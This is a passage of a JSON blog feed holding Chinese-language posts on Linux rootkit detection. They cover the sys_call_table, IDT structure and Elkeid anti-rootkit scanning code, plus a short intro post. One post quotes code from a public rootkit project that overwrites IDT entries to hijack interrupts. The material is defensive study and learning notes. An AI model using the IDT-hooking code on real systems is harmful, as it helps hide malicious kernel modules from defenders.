            "content_html": "<h2 id=\"背景\">背景</h2><p>书接上回，我们对 sys_call_table 继续探究，开篇之前还是先贴一下这个图片。以下代码基于 Kernel Version 4.18</p><p><img src=\"https://chriskaliX.github.io/assets/imgs/callgraph.jpg\" alt=\"简书\" /></p><h2 id=\"基础知识\">基础知识</h2><p>首先我们了解一下，sys_call_table 在 Linux Source Code 中是怎么样的。在 <code class=\"language-plaintext highlighter-rouge\">arch/x86/entry/syscall_64.c</code> 中如下</p><pre><code class=\"language-C\">extern asmlinkage long sys_ni_syscall(const struct pt_regs *);#define __SYSCALL_64(nr, sym, qual) extern asmlinkage long sym(const struct pt_regs *);#include &lt;asm/syscalls_64.h&gt;#undef __SYSCALL_64#define __SYSCALL_64(nr, sym, qual) [nr] = sym,asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {    /*     * Smells like a compiler bug -- it doesn't work     * when the &amp; below is removed.     */    [0 ... __NR_syscall_max] = &amp;sys_ni_syscall,#include &lt;asm/syscalls_64.h&gt;};</code></pre><p>用户态程序调用后进入到 Syscall 陷入中断，在 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 中寻找对应处理程序。对于 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 地址的获取在 Kernel Version 2.6 之后做了隐藏，可以参考这个<a href=\"https://tnichols.org/2015/10/19/Hooking-the-Linux-System-Call-Table/\">文章</a>。</p><p>由于不讨论 Rootkit 具体细节（其实我还没看），仅从检测角度来说在 Elkeid 里的代码和 IDT 检测一样</p><pre><code class=\"language-C\">static void analyze_syscalls(void){    int i;    unsigned long addr;    struct module *mod;    if (!sct || !ckt)        return;            for (i = 0; i &lt; NR_syscalls; i++) {        const char *mod_name = \"-1\";        addr = sct[i];                if (!ckt(addr)) {            module_list_lock();            mod = get_module_from_addr(addr);            if (mod) {                mod_name = mod-&gt;name;            } else {                const char* name = find_hidden_module(addr);                if (IS_ERR_OR_NULL(name)) {                module_list_unlock();                continue;                }                mod_name = name;            }                        syscall_print(mod_name, i);            module_list_unlock();        }    }}</code></pre><p>通过遍历 kobj 判断是否在 kset 里面来判断是否是一个 hidden module。文章暂时属于未完成的状态，后续会有做 Rootkit 的部分在这里补全</p><h2 id=\"题外话\">题外话</h2><p>今天公司的用户态 HIDS 上抓了一个入侵，很兴奋，很少抓到入侵:</p><p>入侵的流程很简单，由于管理疏忽有一个 PHP 的应用存在 RCE，父进程为 php-fpm 的进程执行了 sh 触发了警告，后续就是问题处置</p><p>让我更加明白了，用户态的代码可能和内核态的一样重要。对于绝大部分入侵场景来说，大部分都是在用户态层面的对抗。真正内核态的，可能是占较少部分。所以我一直认为，好的数据采集源是成功的50%，另外的50%在分析</p>",
            "url": "https://chriskalix.github.io/2022/03/21/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%BA%8C-sys-call-table",
            
            
            
            
            
            "date_published": "2022-03-21T00:00:00+01:00",
            "date_modified": "2022-03-21T00:00:00+01:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/03/19/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%B8%80-idt",
            "title": "Linux Rootkit初窥(一)IDT",
            "summary": "Linux Rootkit初窥(一)IDT",
            "content_text": "背景近期在编写 HIDS 相关项目 - Hades，对于用户态的后门或者行为，由于使用了 eBPF 进行内核态的函数 Hook，我们能够发现大部分的行为。只要 Hook 的够全面，几乎能检测到用户层 Rootkit 的一举一动。目前 Hades 项目完成了十余个 hook，覆盖了执行、网络等，后续补全文件侧以及常用的 uprobes，对于用户态后门、入侵行为等能有较全的感知。然而对于 Rootkit，由于笔者知识匮乏，除了 hook do_init_module 和针对 eBPF 程序加载（ebpfkit-monitor）做监测，也不知道如何防范，抓取这样的行为…作为知识的补充，本篇文章涵盖 Rootkit/Linux 基础学习以及一些思考基础知识  由于之前对这部分一窍不通，好多的基础知识我们当作实验，稍微的过一遍。从知乎的回答中我们找到 phrack.org，开始学习。参考 Handling Interrupt Descriptor Table for fun and profit，很大一部分可能会是翻译，翻译的过程就是学习的过程首先，Intel CPU 在保护模式，提供四种模式，即 r0 ~ r3 层，用户层的应用程序一般运行在 r3 层，内核态的运行在 r0 层中断分为可屏蔽和不可屏蔽中断，其中不可屏蔽中断在这里不讨论。中断向量是个0~255之间的数，其中 0~31 是 exceptions 以及不可屏蔽中断， 32~47 是可屏蔽中断，48~255 为软件中断。Linux 下通常使用的是 (0x80) sys_call_table，即用户态通过 syscall 调用到内核函数。同样的，当我们为了获取 sys_call_table 地址也可以从 IDT 中获取什么是 IDT ?  IDT 即 Interrupt Descriptor Table。是一个描述中断即其对应处理函数的线性表，包含四种不同类型的描述/类型。分别是 Task Gate Descriptor（Linux 不使用这种） / Interrupt Gate Descriptor / Trap Gate Descriptor / Call Gate Descriptorenum {    GATE_INTERRUPT = 0xE,    GATE_TRAP = 0xF,    GATE_CALL = 0xC,    GATE_TASK = 0x5,};其中 Interrupt Gate Descriptor 用于中断的处理，需要关注的是 DPL（Descriptor Privilege Level）为0，因此用户态不能访问中断门为了方便理解，借用一个图(这图很经典，方便了解整个流程)：in Linux在 Linux 中，IDT 的定义在 arch/x86/kernel/idt.c ，IDT_ENTRIES 固定为 256gate_desc idt_table[IDT_ENTRIES] __page_aligned_bss;其中 gate_desc 定义如下struct gate_struct {    u16     offset_low;    u16     segment;    struct idt_bits bits;    u16     offset_middle;#ifdef CONFIG_X86_64    u32     offset_high;    u32     reserved;#endif} __attribute__((packed));其中 offset_* 代表中断函数的偏移量，bits 为属性符从项目出发从开始，我们便以字节的 Elkeid 作为参考。Elkeid 主要检查了 4 个，即隐藏内核模块/进程隐藏/IDT劫持/系统调用劫持。我们以 idt rootkit 为关键字，搜索到一些项目。在 idt.c 中，通过替换 IDT 中的函数地址实现 Hook，关键代码如下：void idt_set_entry(unsigned long addr, int n){    if (cur_idt_table == old_idt_table)        set_addr_rw(old_idt_table);    cur_idt_table[n].offset_high = (addr &gt;&gt; 32) &amp; 0xffffffff;    cur_idt_table[n].offset_middle = (addr &gt;&gt; 16) &amp; 0xffff;    cur_idt_table[n].offset_low = addr &amp; 0xffff;    if (cur_idt_table == old_idt_table)        set_addr_ro(old_idt_table);}void idt_substitute(void){    struct desc_ptr idtr;    memcpy(new_idt_table, cur_idt_table, IDT_SZ);    idtr.address = (unsigned long)new_idt_table;    idtr.size = idt_size;    on_each_cpu(local_load_idt, &amp;idtr, 1);    cur_idt_table = new_idt_table;}替换表的形式来完成劫持，其中对 IDTR 寄存器的操作使用 LIDT 指令和 SIDT 指令。另外 sys_call_table 的 hook 应该方法也是类似，先在 IDT 表中找到 0x80 中断的位置，再根据特定 function 再 sys_call_table 中的偏移…顺便贴一张 IDTR在字节的 anti_rootkit 中我们截取 interrupt 检查部分，事实上 sys_call_table 的检查部分也是一样的static void analyze_interrupts(void){#ifdef CONFIG_X86    int i;    unsigned long addr;    struct module *mod;    if (!idt || !ckt)        return;    // 遍历所有 entries    for (i = 0; i &lt; IDT_ENTRIES; i++) {        const char *mod_name = \"-1\";         addr = idt[i];        // ckt 判断是否为内核代码段        if (!ckt(addr)) {            module_list_lock();            // 获取 idt 对应函数的地址            mod = get_module_from_addr(addr);            if (mod) {                mod_name = mod-&gt;name;            } else {                // 寻找是否为隐藏的内核模块                // 通过遍历 ksets 下的 mod list，通过于 kobj 一一比对                // 如果找不到，则为隐藏的内核模块，是可疑的                const char *name = find_hidden_module(addr);                if (IS_ERR_OR_NULL(name)) {                    module_list_unlock();                    continue;                }                mod_name = name;            }            interrupts_print(mod_name, i);            module_list_unlock();        }    }#endif}这种检测，对函数的 entry 做了足够的检测，但是如何检测 hook 在函数中间的情况呢?最后其实看的还是比较浅显的，如果每个模块都单独细钻，会耗费较大的时间，后续会慢慢跟进参考  有字节群中沈平推荐的两本，可以细细品读，我还没看…1, The Rootkit Arsenal Escape and Evasion in the Dark Corners of the System by Bill Blunden， 2nd edition，第一版是中译本2, Rootkits and Bootkits Reversing Modern Malware and Next Generation Threats by Alex Matrosov, Eugene Rodionov, Sergey Bratus，有中译本3, nskernel-kernel-play-guide",
            "content_html": "<h2 id=\"背景\">背景</h2><p>近期在编写 HIDS 相关项目 - <a href=\"https://github.com/chriskaliX/Hades\">Hades</a>，对于用户态的后门或者行为，由于使用了 <code class=\"language-plaintext highlighter-rouge\">eBPF</code> 进行内核态的函数 Hook，我们能够发现大部分的行为。只要 Hook 的够全面，几乎能检测到用户层 <code class=\"language-plaintext highlighter-rouge\">Rootkit</code> 的一举一动。目前 <code class=\"language-plaintext highlighter-rouge\">Hades</code> 项目完成了十余个 hook，覆盖了执行、网络等，后续补全文件侧以及常用的 <code class=\"language-plaintext highlighter-rouge\">uprobes</code>，对于用户态后门、入侵行为等能有较全的感知。然而对于 <code class=\"language-plaintext highlighter-rouge\">Rootkit</code>，由于笔者知识匮乏，除了 hook <code class=\"language-plaintext highlighter-rouge\">do_init_module</code> 和针对 eBPF 程序加载（<a href=\"https://github.com/Gui774ume/ebpfkit-monitor\">ebpfkit-monitor</a>）做监测，也不知道如何防范，抓取这样的行为…作为知识的补充，本篇文章涵盖 Rootkit/Linux 基础学习以及一些思考</p><h3 id=\"基础知识\">基础知识</h3><blockquote>  <p>由于之前对这部分一窍不通，好多的基础知识我们当作实验，稍微的过一遍。从知乎的<a href=\"https://www.zhihu.com/question/33695415\">回答</a>中我们找到 phrack.org，开始学习。参考 <a href=\"http://phrack.org/issues/59/4.html\">Handling Interrupt Descriptor Table for fun and profit</a>，很大一部分可能会是翻译，翻译的过程就是学习的过程</p></blockquote><p>首先，Intel CPU 在保护模式，提供四种模式，即 r0 ~ r3 层，用户层的应用程序一般运行在 r3 层，内核态的运行在 r0 层</p><p>中断分为可屏蔽和不可屏蔽中断，其中不可屏蔽中断在这里不讨论。中断向量是个0~255之间的数，其中 0~31 是 exceptions 以及不可屏蔽中断， 32~47 是可屏蔽中断，48~255 为软件中断。Linux 下通常使用的是 (0x80) sys_call_table，即用户态通过 syscall 调用到内核函数。同样的，当我们为了获取 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 地址也可以从 <code class=\"language-plaintext highlighter-rouge\">IDT</code> 中获取</p><p>什么是 <code class=\"language-plaintext highlighter-rouge\">IDT</code> ?  <code class=\"language-plaintext highlighter-rouge\">IDT</code> 即 Interrupt Descriptor Table。是一个描述中断即其对应处理函数的线性表，包含四种不同类型的描述/类型。分别是 Task Gate Descriptor（Linux 不使用这种） / Interrupt Gate Descriptor / Trap Gate Descriptor / Call Gate Descriptor</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">enum</span> <span class=\"p\">{</span>    <span class=\"n\">GATE_INTERRUPT</span> <span class=\"o\">=</span> <span class=\"mh\">0xE</span><span class=\"p\">,</span>    <span class=\"n\">GATE_TRAP</span> <span class=\"o\">=</span> <span class=\"mh\">0xF</span><span class=\"p\">,</span>    <span class=\"n\">GATE_CALL</span> <span class=\"o\">=</span> <span class=\"mh\">0xC</span><span class=\"p\">,</span>    <span class=\"n\">GATE_TASK</span> <span class=\"o\">=</span> <span class=\"mh\">0x5</span><span class=\"p\">,</span><span class=\"p\">};</span></code></pre></div></div><p>其中 Interrupt Gate Descriptor 用于中断的处理，需要关注的是 DPL（Descriptor Privilege Level）为0，因此用户态不能访问中断门</p><p>为了方便理解，借用一个图(这图很经典，方便了解整个流程)：</p><p><img src=\"https://chriskaliX.github.io/assets/imgs/callgraph.jpg\" alt=\"简书\" /></p><h4 id=\"in-linux\">in Linux</h4><p>在 Linux 中，IDT 的定义在 <code class=\"language-plaintext highlighter-rouge\">arch/x86/kernel/idt.c</code> ，<code class=\"language-plaintext highlighter-rouge\">IDT_ENTRIES</code> 固定为 256</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">gate_desc</span> <span class=\"n\">idt_table</span><span class=\"p\">[</span><span class=\"n\">IDT_ENTRIES</span><span class=\"p\">]</span> <span class=\"n\">__page_aligned_bss</span><span class=\"p\">;</span></code></pre></div></div><p>其中 <code class=\"language-plaintext highlighter-rouge\">gate_desc</code> 定义如下</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">struct</span> <span class=\"n\">gate_struct</span> <span class=\"p\">{</span>    <span class=\"n\">u16</span>     <span class=\"n\">offset_low</span><span class=\"p\">;</span>    <span class=\"n\">u16</span>     <span class=\"n\">segment</span><span class=\"p\">;</span>    <span class=\"k\">struct</span> <span class=\"n\">idt_bits</span> <span class=\"n\">bits</span><span class=\"p\">;</span>    <span class=\"n\">u16</span>     <span class=\"n\">offset_middle</span><span class=\"p\">;</span><span class=\"cp\">#ifdef CONFIG_X86_64</span>    <span class=\"n\">u32</span>     <span class=\"n\">offset_high</span><span class=\"p\">;</span>    <span class=\"n\">u32</span>     <span class=\"n\">reserved</span><span class=\"p\">;</span><span class=\"cp\">#endif</span><span class=\"p\">}</span> <span class=\"n\">__attribute__</span><span class=\"p\">((</span><span class=\"n\">packed</span><span class=\"p\">));</span></code></pre></div></div><p>其中 offset_* 代表中断函数的偏移量，bits 为属性符</p><h3 id=\"从项目出发\">从项目出发</h3><p>从开始，我们便以字节的 Elkeid 作为参考。Elkeid 主要检查了 4 个，即隐藏内核模块/进程隐藏/IDT劫持/系统调用劫持。我们以 idt rootkit 为关键字，搜索到一些<a href=\"https://github.com/kaneschutzman/linux-rootkit\">项目</a>。在 <a href=\"https://github.com/kaneschutzman/linux-rootkit/blob/5dcb228a86f67773d6e2b92276e59cf030b52c23/src/idt.c\">idt.c</a> 中，通过替换 <code class=\"language-plaintext highlighter-rouge\">IDT</code> 中的函数地址实现 Hook，关键代码如下：</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kt\">void</span> <span class=\"nf\">idt_set_entry</span><span class=\"p\">(</span><span class=\"kt\">unsigned</span> <span class=\"kt\">long</span> <span class=\"n\">addr</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"p\">)</span><span class=\"p\">{</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">cur_idt_table</span> <span class=\"o\">==</span> <span class=\"n\">old_idt_table</span><span class=\"p\">)</span>        <span class=\"n\">set_addr_rw</span><span class=\"p\">(</span><span class=\"n\">old_idt_table</span><span class=\"p\">);</span>    <span class=\"n\">cur_idt_table</span><span class=\"p\">[</span><span class=\"n\">n</span><span class=\"p\">].</span><span class=\"n\">offset_high</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"n\">addr</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">32</span><span class=\"p\">)</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xffffffff</span><span class=\"p\">;</span>    <span class=\"n\">cur_idt_table</span><span class=\"p\">[</span><span class=\"n\">n</span><span class=\"p\">].</span><span class=\"n\">offset_middle</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"n\">addr</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">16</span><span class=\"p\">)</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xffff</span><span class=\"p\">;</span>    <span class=\"n\">cur_idt_table</span><span class=\"p\">[</span><span class=\"n\">n</span><span class=\"p\">].</span><span class=\"n\">offset_low</span> <span class=\"o\">=</span> <span class=\"n\">addr</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xffff</span><span class=\"p\">;</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">cur_idt_table</span> <span class=\"o\">==</span> <span class=\"n\">old_idt_table</span><span class=\"p\">)</span>        <span class=\"n\">set_addr_ro</span><span class=\"p\">(</span><span class=\"n\">old_idt_table</span><span class=\"p\">);</span><span class=\"p\">}</span><span class=\"kt\">void</span> <span class=\"nf\">idt_substitute</span><span class=\"p\">(</span><span class=\"kt\">void</span><span class=\"p\">)</span><span class=\"p\">{</span>    <span class=\"k\">struct</span> <span class=\"n\">desc_ptr</span> <span class=\"n\">idtr</span><span class=\"p\">;</span>    <span class=\"n\">memcpy</span><span class=\"p\">(</span><span class=\"n\">new_idt_table</span><span class=\"p\">,</span> <span class=\"n\">cur_idt_table</span><span class=\"p\">,</span> <span class=\"n\">IDT_SZ</span><span class=\"p\">);</span>    <span class=\"n\">idtr</span><span class=\"p\">.</span><span class=\"n\">address</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"kt\">unsigned</span> <span class=\"kt\">long</span><span class=\"p\">)</span><span class=\"n\">new_idt_table</span><span class=\"p\">;</span>    <span class=\"n\">idtr</span><span class=\"p\">.</span><span class=\"n\">size</span> <span class=\"o\">=</span> <span class=\"n\">idt_size</span><span class=\"p\">;</span>    <span class=\"n\">on_each_cpu</span><span class=\"p\">(</span><span class=\"n\">local_load_idt</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">idtr</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">);</span>    <span class=\"n\">cur_idt_table</span> <span class=\"o\">=</span> <span class=\"n\">new_idt_table</span><span class=\"p\">;</span><span class=\"p\">}</span></code></pre></div></div><p>替换表的形式来完成劫持，其中对 IDTR 寄存器的操作使用 LIDT 指令和 SIDT 指令。另外 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 的 hook 应该方法也是类似，先在 IDT 表中找到 0x80 中断的位置，再根据特定 function 再 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 中的偏移…</p><p>顺便贴一张 IDTR</p><p><img src=\"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.it610.com%2Fimage%2Finfo9%2F3a4a1cf12b0940c3a8115008a28511bd.jpg&amp;refer=http%3A%2F%2Fimg.it610.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1650278847&amp;t=cec7d575642e0f888777f63f0507bee7\" alt=\"百度\" /></p><p>在字节的 <code class=\"language-plaintext highlighter-rouge\">anti_rootkit</code> 中我们截取 <code class=\"language-plaintext highlighter-rouge\">interrupt</code> 检查部分，事实上 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 的检查部分也是一样的</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">analyze_interrupts</span><span class=\"p\">(</span><span class=\"kt\">void</span><span class=\"p\">)</span><span class=\"p\">{</span><span class=\"cp\">#ifdef CONFIG_X86</span>    <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"p\">;</span>    <span class=\"kt\">unsigned</span> <span class=\"kt\">long</span> <span class=\"n\">addr</span><span class=\"p\">;</span>    <span class=\"k\">struct</span> <span class=\"n\">module</span> <span class=\"o\">*</span><span class=\"n\">mod</span><span class=\"p\">;</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">idt</span> <span class=\"o\">||</span> <span class=\"o\">!</span><span class=\"n\">ckt</span><span class=\"p\">)</span>        <span class=\"k\">return</span><span class=\"p\">;</span>    <span class=\"c1\">// 遍历所有 entries</span>    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">IDT_ENTRIES</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">const</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">mod_name</span> <span class=\"o\">=</span> <span class=\"s\">\"-1\"</span><span class=\"p\">;</span>         <span class=\"n\">addr</span> <span class=\"o\">=</span> <span class=\"n\">idt</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">];</span>        <span class=\"c1\">// ckt 判断是否为内核代码段</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">ckt</span><span class=\"p\">(</span><span class=\"n\">addr</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"n\">module_list_lock</span><span class=\"p\">();</span>            <span class=\"c1\">// 获取 idt 对应函数的地址</span>            <span class=\"n\">mod</span> <span class=\"o\">=</span> <span class=\"n\">get_module_from_addr</span><span class=\"p\">(</span><span class=\"n\">addr</span><span class=\"p\">);</span>            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">mod</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">mod_name</span> <span class=\"o\">=</span> <span class=\"n\">mod</span><span class=\"o\">-&gt;</span><span class=\"n\">name</span><span class=\"p\">;</span>            <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>                <span class=\"c1\">// 寻找是否为隐藏的内核模块</span>                <span class=\"c1\">// 通过遍历 ksets 下的 mod list，通过于 kobj 一一比对</span>                <span class=\"c1\">// 如果找不到，则为隐藏的内核模块，是可疑的</span>                <span class=\"k\">const</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">name</span> <span class=\"o\">=</span> <span class=\"n\">find_hidden_module</span><span class=\"p\">(</span><span class=\"n\">addr</span><span class=\"p\">);</span>                <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">IS_ERR_OR_NULL</span><span class=\"p\">(</span><span class=\"n\">name</span><span class=\"p\">))</span> <span class=\"p\">{</span>                    <span class=\"n\">module_list_unlock</span><span class=\"p\">();</span>                    <span class=\"k\">continue</span><span class=\"p\">;</span>                <span class=\"p\">}</span>                <span class=\"n\">mod_name</span> <span class=\"o\">=</span> <span class=\"n\">name</span><span class=\"p\">;</span>            <span class=\"p\">}</span>            <span class=\"n\">interrupts_print</span><span class=\"p\">(</span><span class=\"n\">mod_name</span><span class=\"p\">,</span> <span class=\"n\">i</span><span class=\"p\">);</span>            <span class=\"n\">module_list_unlock</span><span class=\"p\">();</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"cp\">#endif</span><span class=\"p\">}</span></code></pre></div></div><p>这种检测，对函数的 entry 做了足够的检测，但是如何检测 hook 在函数中间的情况呢?</p><h2 id=\"最后\">最后</h2><p>其实看的还是比较浅显的，如果每个模块都单独细钻，会耗费较大的时间，后续会慢慢跟进</p><h2 id=\"参考\">参考</h2><blockquote>  <p>有字节群中沈平推荐的两本，可以细细品读，我还没看…</p></blockquote><p>1, The Rootkit Arsenal Escape and Evasion in the Dark Corners of the System by Bill Blunden， 2nd edition，第一版是中译本</p><p>2, Rootkits and Bootkits Reversing Modern Malware and Next Generation Threats by Alex Matrosov, Eugene Rodionov, Sergey Bratus，有中译本</p><p>3, <a href=\"https://nskernel.gitbook.io/kernel-play-guide/hacking-interrupts-exceptions-and-trap-handlers/hooking-an-idt-handler\">nskernel-kernel-play-guide</a></p>",
            "url": "https://chriskalix.github.io/2022/03/19/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%B8%80-idt",
            
            
            
            
            
            "date_published": "2022-03-19T00:00:00+01:00",
            "date_modified": "2022-03-19T00:00:00+01:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/03/18/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%8D%9A%E5%AE%A2",
            "title": "从头开始的博客",
            "summary": "Gridea 用的不习惯",
            "content_text": "规划后续长期做的方向，应该还是 HIDS/WAF 反入侵相关。当然也会涉及 Java/Golang 的一些安全开发，这里将记录我的一切~",
            "content_html": "<h2 id=\"规划\">规划</h2><p>后续长期做的方向，应该还是 HIDS/WAF 反入侵相关。当然也会涉及 Java/Golang 的一些安全开发，这里将记录我的一切~</p>",
            "url": "https://chriskalix.github.io/2022/03/18/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%8D%9A%E5%AE%A2",
            
            
            
            
            
            "date_published": "2022-03-18T00:00:00+01:00",
            "date_modified": "2022-03-18T00:00:00+01:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}